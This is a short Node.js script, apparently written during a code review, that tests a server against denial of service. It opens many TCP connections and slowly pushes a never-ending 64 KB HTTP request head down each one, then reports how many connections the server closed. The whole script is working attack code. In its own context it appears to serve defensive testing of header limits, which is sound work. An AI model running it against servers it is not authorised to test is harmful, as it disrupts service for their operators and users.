// Review 2 #3 DoS client (from the reviewer's dos-client.js): <conns> connections to host:port, each
// slowly sending a never-ending 64 KB request head. Prints a JSON summary and exits after <ms>.
const net = require('net');
const [host, port, conns, ms] = [process.argv[2], Number(process.argv[3]), Number(process.argv[4]), Number(process.argv[5] ?? 6000)];
let done = 0, closedEarly = 0;
for (let c = 0; c < conns; c++) {
  const s = net.connect(port, host);
  s.setNoDelay(true);
  s.on('error', () => {});
  s.on('close', () => closedEarly++);
  s.on('connect', () => {
    s.write('GET http://x/ HTTP/1.1\r\nX: ');
    let sent = 0;
    const pump = () => {
      while (sent < 65000) {
        sent += 16;
        if (!s.write('aaaaaaaaaaaaaaaa')) return s.once('drain', pump);
        if (sent % 1024 === 0) return setImmediate(pump);
      }
      done++;
    };
    pump();
  });
}
setTimeout(() => { console.log(JSON.stringify({ conns, finishedPumping: done, closedByServer: closedEarly })); process.exit(0); }, ms);
